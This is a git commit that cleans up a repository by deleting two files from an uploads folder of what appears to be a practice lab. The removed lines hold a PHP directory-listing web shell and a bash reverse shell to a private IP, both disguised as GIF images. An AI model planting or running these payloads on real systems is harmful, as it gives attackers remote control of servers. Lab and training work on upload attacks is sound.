054850becc9dc03e85355c6cd7236c39c84bacfa
AmasterJT <amasterjt@gmail.com>
2026-04-30 21:01:38 +0200

    limpiamos el repo

--- lab/app/portal_pyme/uploads/file_browser.gif.php
+++
@@ -1,9 +0,0 @@
-GIF89a
-<?php
-$dir = $_GET['dir'] ?? '.';
-$files = scandir($dir);
-
-foreach ($files as $f) {
-    echo "<a href='?dir=$f'>$f</a><br>";
-}
-?>
--- lab/app/portal_pyme/uploads/shell.gif_2.php
+++
@@ -1,4 +0,0 @@
-GIF89a
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.66.100/4444 0>&1'");
-?>
